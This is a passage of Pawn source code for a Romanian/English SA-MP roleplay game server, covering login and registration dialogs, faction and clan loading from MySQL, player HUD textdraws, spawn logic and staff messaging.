		SCM(playerid, COLOR_GENANNOUNCE, "SERVER: {FFFFFF}You already have a registered account, please enter your password into the dialog box.");
		Dialog_Show(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "SERVER: Login", "Welcome to the LocalHost RPG Server.\nPlease enter your password below", "Login", "Cancel");
	}
	else
	{
		SCM(playerid, COLOR_GENANNOUNCE, "SERVER: {FFFFFF}You aren't registered yet. Please enter your desired password in the dialog box to register.");
		Dialog_Show(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "SERVER: Registration", "Welcome to the LocalHost RPG Server.\nPlease enter your desired password below!", "Register", "Cancel");
	}
    new 
        loginname[158];
    GetPlayerName(playerid,loginname,sizeof(loginname));
    for(new clanid; clanid < MAX_CLANS; clanid++)
    {
        if( !strlen( ClanInfo[clanid][cTag] ) ) continue;
        if(strfind(loginname,ClanInfo[clanid][cTag],true) != -1)
        {
            for(new i; i < 20; ++i)
                SCM(playerid, -1, "");
            format(gString,sizeof(gString),"Nu poti folosi acel username. '%s' este inregistrat de un clan. Nu poti folosi acel cuvant in nickname-ul tau.",ClanInfo[clanid][cTag]);
            SendClientMessage(playerid, COLOR_RED, gString);
            format(gString,sizeof(gString),"You can't use that username! '%s' is a registered clan tag. You can't use that word in your nickname.",ClanInfo[clanid][cTag]);
            SendClientMessage(playerid, COLOR_RED, gString);
            KickEx(playerid);
            gString[0] = ( EOS );
        }
    }
	return 1;
}

function LoadFactions()
{
	if(!cache_num_rows())
		return 1;

	SERVER_FACTIONS = cache_num_rows();

    for(new i = 1; i <= cache_num_rows(); i++)
    {
		new f = i - 1;
		DynamicFactions[i][fID]                 = cache_get_field_content_int(f, "ID");
        cache_get_field_content(f, "Name", DynamicFactions[i][fName], SQL, 130);
		DynamicFactions[i][fcX]                 = cache_get_field_content_float(f, "X");
   	    DynamicFactions[i][fcY]                 = cache_get_field_content_float(f, "Y");
    	DynamicFactions[i][fcZ]                 = cache_get_field_content_float(f, "Z");
    	DynamicFactions[i][fceX]                = cache_get_field_content_float(f, "eX");
   	    DynamicFactions[i][fceY]                = cache_get_field_content_float(f, "eY");
    	DynamicFactions[i][fceZ]                = cache_get_field_content_float(f, "eZ");
    	DynamicFactions[i][fSafePos][0]			= cache_get_field_content_float(f, "SafePos1");
    	DynamicFactions[i][fSafePos][1]			= cache_get_field_content_float(f, "SafePos2");
    	DynamicFactions[i][fSafePos][2]			= cache_get_field_content_float(f, "SafePos3");
    	DynamicFactions[i][fMats]               = cache_get_field_content_int(f, "Mats");
    	DynamicFactions[i][fInterior]           = cache_get_field_content_int(f, "Interior");
    	DynamicFactions[i][fVirtual]            = cache_get_field_content_int(f, "Virtual");
    	DynamicFactions[i][fMapIcon]            = cache_get_field_content_int(f, "MapIcon");
    	DynamicFactions[i][fLocked]            	= cache_get_field_content_int(f, "Locked");
    	DynamicFactions[i][fDrugs]              = cache_get_field_content_int(f, "Drugs");
    	DynamicFactions[i][fBank]               = cache_get_field_content_int(f, "Bank");
    	DynamicFactions[i][fPickupIDD]          = cache_get_field_content_int(f, "PickupID");
        cache_get_field_content(f, "Anunt", DynamicFactions[i][fAnn], SQL, 128);
    	DynamicFactions[i][fWin]                = cache_get_field_content_int(f, "Win");
    	DynamicFactions[i][fLost]               = cache_get_field_content_int(f, "Lost");
    	DynamicFactions[i][fMaxMembers]         = cache_get_field_content_int(f, "MaxMembers");
		DynamicFactions[i][fMinLevel]         	= cache_get_field_content_int(f, "MinLevel");
    	DynamicFactions[i][fApplication]        = cache_get_field_content_int(f, "Application");
		
		cache_get_field_content(f, "Rank1", DynamicFactions[i][fRankName1], SQL, 32);
		cache_get_field_content(f, "Rank2", DynamicFactions[i][fRankName2], SQL, 32);
		cache_get_field_content(f, "Rank3", DynamicFactions[i][fRankName3], SQL, 32);
		cache_get_field_content(f, "Rank4", DynamicFactions[i][fRankName4], SQL, 32);
		cache_get_field_content(f, "Rank5", DynamicFactions[i][fRankName5], SQL, 32);
		cache_get_field_content(f, "Rank6", DynamicFactions[i][fRankName6], SQL, 32);
		cache_get_field_content(f, "Rank7", DynamicFactions[i][fRankName7], SQL, 32);

	   	DynamicFactions[i][fPickupID] = CreateDynamicPickup(DynamicFactions[i][fPickupIDD], 23, DynamicFactions[i][fceX], DynamicFactions[i][fceY], DynamicFactions[i][fceZ], 0, -1, -1, 20);

	   	format(gString, sizeof gString, "{909CE7}Faction:{ffffff} %d\n{909CE7}Name:{FFFFFF} %s\n{909CE7}HQ Status:{ffffff} %s", DynamicFactions[i][fID], DynamicFactions[i][fName], (DynamicFactions[i][fLocked] ? ("locked") : ("unlocked")));
		DynamicFactions[i][fLabelID] = CreateDynamic3DTextLabel(gString, -1, DynamicFactions[i][fceX], DynamicFactions[i][fceY], DynamicFactions[i][fceZ], 100, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0);
		
		if(DynamicFactions[i][fMapIcon] != 0) 
			CreateDynamicMapIcon(DynamicFactions[i][fceX], DynamicFactions[i][fceY], DynamicFactions[i][fceZ], DynamicFactions[i][fMapIcon], 0, -1, -1, -1, 750.0);

		format(gString, sizeof gString, "%s\nGroup Safe", DynamicFactions[i][fName]);
		
		DynamicFactions[i][fSafePickupID] = CreateDynamicPickup(1274, 23, DynamicFactions[i][fSafePos][0], DynamicFactions[i][fSafePos][1], DynamicFactions[i][fSafePos][2], DynamicFactions[i][fVirtual], DynamicFactions[i][fInterior], -1, 20.0);
		DynamicFactions[i][fSafeLabelID] = CreateDynamic3DTextLabel(gString, COLOR_YELLOW, DynamicFactions[i][fSafePos][0], DynamicFactions[i][fSafePos][1], DynamicFactions[i][fSafePos][2], 100 , INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, DynamicFactions[i][fVirtual], DynamicFactions[i][fInterior], -1, 20.0);
	
		DynamicFactions[i][fSphere] = CreateDynamicSphere(DynamicFactions[i][fceX], DynamicFactions[i][fceY], DynamicFactions[i][fceZ], 1.5, 0, 0, -1);
		Streamer_SetIntData(STREAMER_TYPE_AREA, DynamicFactions[i][fSphere], E_STREAMER_EXTRA_ID, (i + STREAMER_BEGIN_FACTIONS));
	}
	return printf("Factions Loaded (total: %d)", cache_num_rows());
}

function SetPlayerToTeamColor(playerid)
{
	if(!s_PlayerInfo[playerid][pSOnDuty])
		SetPlayerColor(playerid, COLOR_WHITE);
	else
	{
		switch(PlayerInfo[playerid][pMember])
		{
			case 1: SetPlayerColor(playerid, 0x0049D0FF); // LSPD
			case 2: SetPlayerColor(playerid, 0x005AFFFF); // FBI
			case 3: SetPlayerColor(playerid, 0x00006AFF); // NG
			case 4: SetPlayerColor(playerid, 0xACFA57AA); // Italian
			case 5: SetPlayerColor(playerid, 0x348818AA); // Grove
			case 6: SetPlayerColor(playerid, 0x3C3432C8); // The Russian
			case 7: SetPlayerColor(playerid, 0xF02410FF); // Mayor
			case 8: SetPlayerColor(playerid, 0x0049D0FF); // SFPD
			case 9: SetPlayerColor(playerid, 0xEFC6FFFF); // NR
			case 10: SetPlayerColor(playerid, 0x8D6455FF); // SF Bikers
			case 11: SetPlayerColor(playerid, 0x7E3937FF); // Hitman
			case 12: SetPlayerColor(playerid, 0x00D179FF); // SI
			case 13: SetPlayerColor(playerid, COLOR_YELLOW); // TAXI
			case 14: SetPlayerColor(playerid, 0xf86448FF); // Paramedic
		}
	}   
	return 1;
}

function ShowFactions(playerid)
{
    check_queries

	format(gString, sizeof gString, "{FFFFFF}ID\tName\t{FFFFFF}Members\t{FFFFFF}Max members\n");
	for(new i = 1; i < sizeof DynamicFactions; i++)
	{
		format(gString, sizeof gString, "%s%d\t\t%s\t%d (%d online)\t%d\n", gString, i, DynamicFactions[i][fName], GetFactionMembers(i), Iter_Count(FactionMembers<i>), DynamicFactions[i][fMaxMembers]);
	}
	return Dialog_Show(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "Factiuni", gString, "Ok", "");
}

function SetPlayerPositionEx(playerid, Float:x, Float:y, Float:z, interior, virtual)
{
    SetPlayerPosEx(playerid, x, y, z);
    SetPlayerVirtualWorld(playerid, virtual);
    SetPlayerInterior(playerid, interior);
    return 1; 
}

function IsABike(carid)
{
    if(GetVehicleModel(carid) == 481 || GetVehicleModel(carid) == 509 || GetVehicleModel(carid) == 510)
    {
        return 1;
    }
    return 0;
}

function IsABoat(carid)
{
    if(GetVehicleModel(carid) == 430 || GetVehicleModel(carid) == 446 || GetVehicleModel(carid) == 452 || GetVehicleModel(carid) == 453 || GetVehicleModel(carid) == 454 || GetVehicleModel(carid) == 472 || GetVehicleModel(carid) == 473 || GetVehicleModel(carid) == 484 || GetVehicleModel(carid) == 493 || GetVehicleModel(carid) == 595)
    {
        return 1;
    }
    return 0;
}

function IsAPlane(carid)
{
    if(GetVehicleModel(carid) == 417 || GetVehicleModel(carid) == 425 || GetVehicleModel(carid) == 447 || GetVehicleModel(carid) == 460 || GetVehicleModel(carid) == 464 || GetVehicleModel(carid) == 465 || GetVehicleModel(carid) == 469 || GetVehicleModel(carid) == 476 || GetVehicleModel(carid) == 487 || GetVehicleModel(carid) == 488 || GetVehicleModel(carid) == 497 || GetVehicleModel(carid) == 501 || GetVehicleModel(carid) == 511 || GetVehicleModel(carid) == 512 || GetVehicleModel(carid) == 513
     || GetVehicleModel(carid) == 519 || GetVehicleModel(carid) == 520 || GetVehicleModel(carid) == 548 || GetVehicleModel(carid) == 553 || GetVehicleModel(carid) == 563 || GetVehicleModel(carid) == 577 || GetVehicleModel(carid) == 592 || GetVehicleModel(carid) == 593)
    {
        return 1;
    }
    return 0;
}

function StopAudioStreamForPlayersInCar(vehicleid)
{
    foreach(new i : PlayersInVehicle)
    {
        if(GetPlayerVehicleID(i) == vehicleid)
            StopAudioStreamForPlayer(i);
    }
    return 1;
}

function showActiveCheckpointDialog(playerid)
{
	return Dialog_Show(playerid, DIALOG_CANCELCP, DIALOG_STYLE_MSGBOX, "Anulare Checkpoint", "Esti sigur ca vrei sa anulezi checkpoint-ul curent?", "Da", "Nu");
}

function UnFreezeStation(playerid)
{
	return TogglePlayerControllable(playerid, 1);
}	

function SlapPlayer(playerid) 
{
    TogglePlayerControllable(playerid, 0);

    new 
    	Float: playerPos[3];

    GetPlayerPos(playerid, playerPos[0], playerPos[1], playerPos[2]);
    SetPlayerPosEx(playerid, playerPos[0], playerPos[1], playerPos[2]+2);
    
    PlayerPlaySound(playerid, 1190, 0, 0, 10.0);
    return UnFreezeStation(playerid);
}

function sendDebugMessage(const string[], va_args<>)
{
	#if !defined SV_TESTE
		return 1;
	#endif

	new
		stringMessage[144];

	va_format(stringMessage, sizeof stringMessage, string, va_start<1>);
	return print(stringMessage);
}
function LoadClans( )
{
    if( !cache_get_row_count( ) ) return printf( "Nu exista clanuri in baza de date!" );
    for( new i = 0; i < cache_get_row_count(); i++ )
    {
        new id = cache_get_field_content_int( i, "ID" );
        cache_get_field_content( i , "Name", ClanInfo[ id ][ cName ], 1, 64 );
        cache_get_field_content( i , "Tag", ClanInfo[ id ][ cTag ], 1, 16 );
        ClanInfo[ id ][ cMembers ] = cache_get_field_content_int( i, "Members" );
        ClanInfo[ id ][ cSlots ] = cache_get_field_content_int( i, "Slots" );
        cache_get_field_content( i , "R1", CRank[ id ][ 1 ] , 1 , 32 );
        cache_get_field_content( i , "R2", CRank[ id ][ 2 ] , 1 , 32 );
        cache_get_field_content( i , "R3", CRank[ id ][ 3 ] , 1 , 32 );
        cache_get_field_content( i , "R4", CRank[ id ][ 4 ] , 1 , 32 );
        cache_get_field_content( i , "R5", CRank[ id ][ 5 ] , 1, 32 );
        cache_get_field_content( i , "R6", CRank[ id ][ 6 ] , 1 , 32 );
        cache_get_field_content( i , "R7", CRank[ id ][ 7 ] , 1 , 32 );
        printf( "Clanuri incarcate: %s - %d membri", ClanInfo[ id ][ cName ], ClanInfo[ id ][ cMembers ] );
    }
    return 1;
}
function LoadSystems()
{
	mysql_tquery(SQL, "select * from `houses` order by `ID` asc;", "LoadHouses", "");
	mysql_tquery(SQL, "select * from `bizz` order by `ID` asc;", "LoadBizz", "");
	mysql_tquery(SQL, "select * from `cars` order by `ID` asc;", "LoadPlayerVehicles", "");
	mysql_tquery(SQL, "select * from `factions` order by `ID` asc;", "LoadFactions", "");
    mysql_tquery(SQL, "select * from `atms` order by `atmId` asc;", "LoadATMs", "");
    mysql_tquery(SQL, "select * from `stock` order by `ID` asc;", "LoadStock", "");
    mysql_tquery(SQL, "select * from `dealer_cars` order by `ds_Id` asc;", "loadServerDealership", "");
    mysql_tquery(SQL, "select * from `clans` order by `ID` asc;", "LoadClans", "");


	Command_AddAltNamed("radio", "r");
    Command_AddAltNamed("cpanel", "clan");
    Command_AddAltNamed("newbie", "n");
	Command_AddAltNamed("fixveh", "fv");
    Command_AddAltNamed("email", "emails");
	Command_AddAltNamed("respawn", "spawn");
	Command_AddAltNamed("departments", "d");
	Command_AddAltNamed("spawncar", "vspawn");
    Command_AddAltNamed("newbie", "newbiechat");
    Command_AddAltNamed("playersearch", "ip");
    Command_AddAltNamed("forcenamechange", "fnc");
    Command_AddAltNamed("cancelname", "cn");
    Command_AddAltNamed("acceptname", "an");
    Command_AddAltNamed("respawn", "spawn");
    Command_AddAltNamed("fvrespawn", "fvr");
    Command_AddAltNamed("romana", "ro");
    Command_AddAltNamed("english", "en");
    Command_AddAltNamed("locations", "gps");
    Command_AddAltNamed("locations", "where");
    Command_AddAltNamed("cheat", "cheats");
    //loadServerDealership();
}

function sendNearbyMessage(playerid, color, const string[], va_args<>)
{
	new
		stringMessage[144], Float: returnPos[3];

	GetPlayerPos(playerid, returnPos[0], returnPos[1], returnPos[2]);

	va_format(stringMessage, sizeof stringMessage, string, va_start<3>);
	SCM(playerid, color, stringMessage);
	
	foreach(new i : streamedPlayers[playerid])
	{
		if(IsPlayerInRangeOfPoint(i, 25.0, returnPos[0], returnPos[1], returnPos[2]))
			SCM(i, color, stringMessage);
	}
	return 1;
}

function sendStaffMessage(color, const string[], va_args<>) 
{
	new 
		stringMessage[128];
    
    va_format(stringMessage, sizeof stringMessage, string, va_start<2>);
    
    foreach(new i : Admins) 
    {
    	if(!s_PlayerInfo[i][pSLoggedIn])
    		continue; 
    	
    	if(PlayerInfo[i][pAdmin]) SCM(i, color, stringMessage);
    }

    foreach(new i : Helpers) 
    {
    	if(Iter_Contains(Admins, i))
    		continue;

    	if(!s_PlayerInfo[i][pSLoggedIn])
    		continue; 
    	
    	if(PlayerInfo[i][pHelper]) SCM(i, color, stringMessage);
    }
    return 1;
}

function ABroadCast(color, level, const string[], va_args<>)
{
	new
		stringMessage[128];

    va_format(stringMessage, sizeof stringMessage, string, va_start<3>);

    foreach(new i : Admins)
    {
    	if(s_PlayerInfo[i][pSLoggedIn])
    	{
    		if (PlayerInfo[i][pAdmin] >= level)
    			SendSplitMessage(i, color, stringMessage);
    	}
    }
    return 1;
}

function SetPlayerPosEx(playerid, Float:X, Float:Y, Float:Z) 
{
    SetPlayerPos(playerid, X, Y, Z);
    SetCameraBehindPlayer(playerid);
}

function sendAcces(playerid)
{
    return SCM(playerid, -1, "Nu aveti gradul administrativ necesar.");
}

function LoadPlayerTDs(playerid)
{
    DMVexam[playerid] = CreatePlayerTextDraw(playerid, 284.000091, 375.573822, "~y~PRACTICAL EXAM");
    PlayerTextDrawLetterSize(playerid, DMVexam[playerid], 0.200399, 1.196799);
    PlayerTextDrawAlignment(playerid, DMVexam[playerid], 1);
    PlayerTextDrawColor(playerid, DMVexam[playerid], -1);
    PlayerTextDrawSetShadow(playerid, DMVexam[playerid], 0);
    PlayerTextDrawSetOutline(playerid, DMVexam[playerid], 1);
    PlayerTextDrawBackgroundColor(playerid, DMVexam[playerid], 255);
    PlayerTextDrawFont(playerid, DMVexam[playerid], 2);
    PlayerTextDrawSetProportional(playerid, DMVexam[playerid], 1);

    DMVcheck[playerid] = CreatePlayerTextDraw(playerid, 284.000091, 384.533905, " ");
    PlayerTextDrawLetterSize(playerid, DMVcheck[playerid], 0.200399, 1.196799);
    PlayerTextDrawAlignment(playerid, DMVcheck[playerid], 1);
    PlayerTextDrawColor(playerid, DMVcheck[playerid], -1);
    PlayerTextDrawSetShadow(playerid, DMVcheck[playerid], 0);
    PlayerTextDrawSetOutline(playerid, DMVcheck[playerid], 1);
    PlayerTextDrawBackgroundColor(playerid, DMVcheck[playerid], 255);
    PlayerTextDrawFont(playerid, DMVcheck[playerid], 2);
    PlayerTextDrawSetProportional(playerid, DMVcheck[playerid], 1);

    LogoPTD[playerid] = CreatePlayerTextDraw(playerid, 636.220581, 432.350585, "EQUINOXADV / RPG.T4P.RO");
    PlayerTextDrawLetterSize(playerid, LogoPTD[playerid], 0.231433, 1.429164);
    PlayerTextDrawAlignment(playerid, LogoPTD[playerid], 3);
    PlayerTextDrawColor(playerid, LogoPTD[playerid], -1);
    PlayerTextDrawSetShadow(playerid, LogoPTD[playerid], 0);
    PlayerTextDrawSetOutline(playerid, LogoPTD[playerid], 1);
    PlayerTextDrawBackgroundColor(playerid, LogoPTD[playerid], 255);
    PlayerTextDrawFont(playerid, LogoPTD[playerid], 2);
    PlayerTextDrawSetProportional(playerid, LogoPTD[playerid], 1);

	WantedTD[playerid] = CreatePlayerTextDraw(playerid, 18.470577, 315.083252, "wanted scade in: ~r~05:46");
	PlayerTextDrawLetterSize(playerid, WantedTD[playerid], 0.270588, 1.290833);
	PlayerTextDrawTextSize(playerid, WantedTD[playerid], 1280.000000, 1280.000000);
	PlayerTextDrawAlignment(playerid, WantedTD[playerid], 1);
	PlayerTextDrawColor(playerid, WantedTD[playerid], 0xFFFFFFFF);
	PlayerTextDrawUseBox(playerid, WantedTD[playerid], 0);
	PlayerTextDrawBoxColor(playerid, WantedTD[playerid], 0x80808080);
	PlayerTextDrawSetShadow(playerid, WantedTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, WantedTD[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, WantedTD[playerid], 0x000000FF);
	PlayerTextDrawFont(playerid, WantedTD[playerid], 3);
	PlayerTextDrawSetProportional(playerid, WantedTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, WantedTD[playerid], 0);

    FPSHud[playerid] = CreatePlayerTextDraw(playerid, 4.064932, 432.518493, "FPS:_~g~52~w~_/_REPORTS:_~r~0~w~_/_CHEATERS:_~r~0~w~_/_ANIM:_~r~0~w~_/_TICKS:_~y~174~w~_/_QUERIES:_~b~0");
    PlayerTextDrawLetterSize(playerid, FPSHud[playerid], 0.231422, 1.374999);
    PlayerTextDrawTextSize(playerid, FPSHud[playerid], 500.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, FPSHud[playerid], 1);
    PlayerTextDrawColor(playerid, FPSHud[playerid], -1);
    PlayerTextDrawSetShadow(playerid, FPSHud[playerid], 0);
    PlayerTextDrawSetOutline(playerid, FPSHud[playerid], 1);
    PlayerTextDrawBackgroundColor(playerid, FPSHud[playerid], 255);
    PlayerTextDrawFont(playerid, FPSHud[playerid], 2);
    PlayerTextDrawSetProportional(playerid, FPSHud[playerid], 1);

    HudTD[playerid] = CreatePlayerTextDraw(playerid, 558.235352, 121.916679, "LEVEL 0 (0/0 RESPECT)");
    PlayerTextDrawLetterSize(playerid, HudTD[playerid], 0.129528, 1.144999);
    PlayerTextDrawTextSize(playerid, HudTD[playerid], 1280.000000, 1280.000000);
    PlayerTextDrawAlignment(playerid, HudTD[playerid], 2);
    PlayerTextDrawColor(playerid, HudTD[playerid], 0xFFFFFFFF);
    PlayerTextDrawUseBox(playerid, HudTD[playerid], 0);
    PlayerTextDrawBoxColor(playerid, HudTD[playerid], 0x80808080);
    PlayerTextDrawSetShadow(playerid, HudTD[playerid], 0);
    PlayerTextDrawSetOutline(playerid, HudTD[playerid], 1);
    PlayerTextDrawBackgroundColor(playerid, HudTD[playerid], 0x00000033);
    PlayerTextDrawFont(playerid, HudTD[playerid], 2);
    PlayerTextDrawSetProportional(playerid, HudTD[playerid], 1);
    PlayerTextDrawSetSelectable(playerid, HudTD[playerid], 0);

    HUDProgress[playerid] = CreatePlayerProgressBar(playerid, 513.00, 136.00, 92.50, 1.50, -16776961, 100.0);

    veh_speedo[playerid] = CreatePlayerTextDraw(playerid, 506.045806, 341.517913, "SPEED: ~g~558 ~w~KM/H~n~~w~FUEL: ~g~100~n~~w~RADIO: ~g~None");
    PlayerTextDrawLetterSize(playerid, veh_speedo[playerid], 0.212472, 1.322498);
    PlayerTextDrawTextSize(playerid, veh_speedo[playerid], 700.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, veh_speedo[playerid], 1);
    PlayerTextDrawColor(playerid, veh_speedo[playerid], -1);
    PlayerTextDrawSetShadow(playerid, veh_speedo[playerid], 0);
    PlayerTextDrawSetOutline(playerid, veh_speedo[playerid], 1);
    PlayerTextDrawBackgroundColor(playerid, veh_speedo[playerid], 255);
    PlayerTextDrawFont(playerid, veh_speedo[playerid], 2);
    PlayerTextDrawSetProportional(playerid, veh_speedo[playerid], 1);

    Speedo[playerid][0] = CreatePlayerTextDraw(playerid, 581.733520, 325.344482, "0");
    PlayerTextDrawLetterSize(playerid, Speedo[playerid][0], 0.612999, 2.744889);
    PlayerTextDrawAlignment(playerid, Speedo[playerid][0], 3);
    PlayerTextDrawColor(playerid, Speedo[playerid][0], -1);
    PlayerTextDrawSetShadow(playerid, Speedo[playerid][0], 0);
    PlayerTextDrawSetOutline(playerid, Speedo[playerid][0], 1);
    PlayerTextDrawBackgroundColor(playerid, Speedo[playerid][0], 255);
    PlayerTextDrawFont(playerid, Speedo[playerid][0], 3);
    PlayerTextDrawSetProportional(playerid, Speedo[playerid][0], 1);
    PlayerTextDrawSetShadow(playerid, Speedo[playerid][0], 0);

    Speedo[playerid][1] = CreatePlayerTextDraw(playerid, 583.000000, 333.940887, "km/h");
    PlayerTextDrawLetterSize(playerid, Speedo[playerid][1], 0.383333, 1.695407);
    PlayerTextDrawAlignment(playerid, Speedo[playerid][1], 1);
    PlayerTextDrawColor(playerid, Speedo[playerid][1], -1);
    PlayerTextDrawSetShadow(playerid, Speedo[playerid][1], 0);
    PlayerTextDrawSetOutline(playerid, Speedo[playerid][1], 1);
    PlayerTextDrawBackgroundColor(playerid, Speedo[playerid][1], 255);
    PlayerTextDrawFont(playerid, Speedo[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, Speedo[playerid][1], 1);
    PlayerTextDrawSetShadow(playerid, Speedo[playerid][1], 0);

    Speedo[playerid][2] = CreatePlayerTextDraw(playerid, 619.333312, 350.518615, "FUEL: ~p~18~n~~w~~h~RADIO: ~p~NONE~n~14026 ~w~~h~km~n~UNLOCKED");
    PlayerTextDrawLetterSize(playerid, Speedo[playerid][2], 0.176666, 1.483851);
    PlayerTextDrawAlignment(playerid, Speedo[playerid][2], 3);
    PlayerTextDrawColor(playerid, Speedo[playerid][2], -1);
    PlayerTextDrawSetShadow(playerid, Speedo[playerid][2], 0);
    PlayerTextDrawSetOutline(playerid, Speedo[playerid][2], 1);
    PlayerTextDrawBackgroundColor(playerid, Speedo[playerid][2], 255);
    PlayerTextDrawFont(playerid, Speedo[playerid][2], 2);
    PlayerTextDrawSetProportional(playerid, Speedo[playerid][2], 1);
    PlayerTextDrawSetShadow(playerid, Speedo[playerid][2], 0);

    PayDayTD[playerid][0] = CreatePlayerTextDraw(playerid, 558.235352, 140.916679, "Next_payday_in_~r~60:00~w~");
    PlayerTextDrawLetterSize(playerid, PayDayTD[playerid][0], 0.154164, 0.941479);
    PlayerTextDrawAlignment(playerid, PayDayTD[playerid][0], 2);
    PlayerTextDrawColor(playerid, PayDayTD[playerid][0], -1);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][0], 0);
    PlayerTextDrawSetOutline(playerid, PayDayTD[playerid][0], 1);
    PlayerTextDrawBackgroundColor(playerid, PayDayTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, PayDayTD[playerid][0], 2);
    PlayerTextDrawSetProportional(playerid, PayDayTD[playerid][0], 1);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][0], 0);

    PayDayTD[playerid][1] = CreatePlayerTextDraw(playerid, 12.400188, 200.951187, "box");
    PlayerTextDrawLetterSize(playerid, PayDayTD[playerid][1], 0.000000, 7.587418);
    PlayerTextDrawTextSize(playerid, PayDayTD[playerid][1], 174.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, PayDayTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, PayDayTD[playerid][1], -1);
    PlayerTextDrawUseBox(playerid, PayDayTD[playerid][1], 1);
    PlayerTextDrawBoxColor(playerid, PayDayTD[playerid][1], 150);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][1], 0);
    PlayerTextDrawSetOutline(playerid, PayDayTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, PayDayTD[playerid][1], 177);
    PlayerTextDrawFont(playerid, PayDayTD[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, PayDayTD[playerid][1], 0);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][1], 0);
     
    PayDayTD[playerid][2] = CreatePlayerTextDraw(playerid, 72.800224, 200.567214, "PAYDAY");
    PlayerTextDrawLetterSize(playerid, PayDayTD[playerid][2], 0.360199, 1.644667);
    PlayerTextDrawAlignment(playerid, PayDayTD[playerid][2], 1);
    PlayerTextDrawColor(playerid, PayDayTD[playerid][2], -1);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][2], 0);
    PlayerTextDrawSetOutline(playerid, PayDayTD[playerid][2], -1);
    PlayerTextDrawBackgroundColor(playerid, PayDayTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, PayDayTD[playerid][2], 1);
    PlayerTextDrawSetProportional(playerid, PayDayTD[playerid][2], 1);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][2], 0);
     
    PayDayTD[playerid][3] = CreatePlayerTextDraw(playerid, 14.000034, 220.651077, "BANK BALANCE: $130,491,948~n~INTEREST: $705.224~n~RENT: $3.750");
    PlayerTextDrawLetterSize(playerid, PayDayTD[playerid][3], 0.244799, 1.102220);
    PlayerTextDrawAlignment(playerid, PayDayTD[playerid][3], 1);
    PlayerTextDrawColor(playerid, PayDayTD[playerid][3], -1);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][3], 0);
    PlayerTextDrawSetOutline(playerid, PayDayTD[playerid][3], 1);
    PlayerTextDrawBackgroundColor(playerid, PayDayTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, PayDayTD[playerid][3], 3);
    PlayerTextDrawSetProportional(playerid, PayDayTD[playerid][3], 1);
    PlayerTextDrawSetShadow(playerid, PayDayTD[playerid][3], 0);

	return 1;
}

function SetPlayerSpawn(playerid)
{
	s_PlayerInfo[playerid][pSInHQ] = 0;
	s_PlayerInfo[playerid][pSInHouse] = 0;
	s_PlayerInfo[playerid][pSInBusiness] = 0;

	SetPlayerSkinEx(playerid);

	if(!PlayerInfo[playerid][pTut] && s_PlayerInfo[playerid][pSLoggedIn])
	{
        proceed_connect_camera(playerid);

		SCM(playerid, COLOR_TEAL, "----------------------------------------------------------------------------");
		SCMF(playerid, COLOR_YELLOW, "Welcome to LocalHost RPG, %s.", GetName(playerid));

		Dialog_Show(playerid, DIALOG_REGISTER_TWO, DIALOG_STYLE_MSGBOX, "Language", "Alege limba in care vrei sa fie afisate mesajele de pe server.\nChoose the language that you speak.", "Romana", "English");
        proceed_connect_camera(playerid);
        return 1;	
    }

	if(PlayerInfo[playerid][pHouse] && PlayerInfo[playerid][pSpawnChange] == 1)
	{
        new
        	houseId = PlayerInfo[playerid][pHouse];

        SetPlayerPosEx(playerid, HouseInfo[houseId][hInterior][0], HouseInfo[houseId][hInterior][1], HouseInfo[houseId][hInterior][2]);
        
        SetPlayerVirtualWorld(playerid, houseId);
        SetPlayerInterior(playerid, HouseInfo[houseId][hInteriorVar]);

        if(HouseInfo[houseId][hRadio])
        {
            StopAudioStreamForPlayer(playerid);
            PlayAudioStreamForPlayer(playerid, RadioLinks[HouseInfo[houseId][hRadio]]);
        }

        return s_PlayerInfo[playerid][pSInHouse] = houseId;
	}


    //updatecv
    UpdateSecondary(playerid);
    //
	if(PlayerInfo[playerid][pMember] == 0)
	{
		SetPlayerPosEx(playerid, 1481.1981, -1766.7954, 18.7958);
		
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else
	{
		if(PlayerInfo[playerid][pMember] != 0)
		{
			new
				factionId = PlayerInfo[playerid][pMember];

			SetPlayerPosEx(playerid, DynamicFactions[factionId][fcX], DynamicFactions[factionId][fcY], DynamicFactions[factionId][fcZ]);
			
			SetPlayerToTeamColor(playerid);			
			SetPlayerInterior(playerid, DynamicFactions[factionId][fInterior]);
			SetPlayerVirtualWorld(playerid, factionId);
			
			s_PlayerInfo[playerid][pSInHQ] = factionId;
		}
	}
    if(PlayerInfo[playerid][pPet] != 0 && PlayerInfo[playerid][pPetStatus] != 0)
        AttachPet(playerid);

	return 1;
}
forward UpdateSecondary(playerid);
public UpdateSecondary(playerid)
{
    Update(playerid, pConnectTimex);
    Update(playerid, pExpx);
    return 1; }
function WhenPlayerLoggedIn(playerid)
{
	GameTextForPlayer(playerid, "~b~~h~~h~LOGGING IN~w~...", 1000, 3);

	if(!cache_num_rows())
	{
		SetPVarInt(playerid, "login_tries", GetPVarInt(playerid, "login_tries") + 1);
		if(GetPVarInt(playerid, "login_tries") >= 3)
		{
			SCM(playerid, COLOR_RED, "You have used all available login attempts.");

